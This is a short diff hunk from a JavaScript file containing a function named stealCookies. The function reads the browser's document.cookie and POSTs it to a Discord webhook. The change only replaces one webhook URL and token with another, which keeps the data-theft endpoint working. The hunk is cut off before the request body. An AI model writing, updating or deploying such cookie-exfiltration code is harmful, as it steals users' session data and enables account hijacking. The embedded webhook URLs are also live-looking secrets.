@@ -2,7 +2,7 @@
 function stealCookies() {
     var cookies = document.cookie;
     // Send cookies to a remote server
-    fetch('https://discord.com/api/webhooks/1231425931453792256/zDbYK2ISGhEl32ory64ubBIB3jv0oPibP5XW1MZA7ztB32zvvZdVyzGBM2_yGimCi5Td', {
+    fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
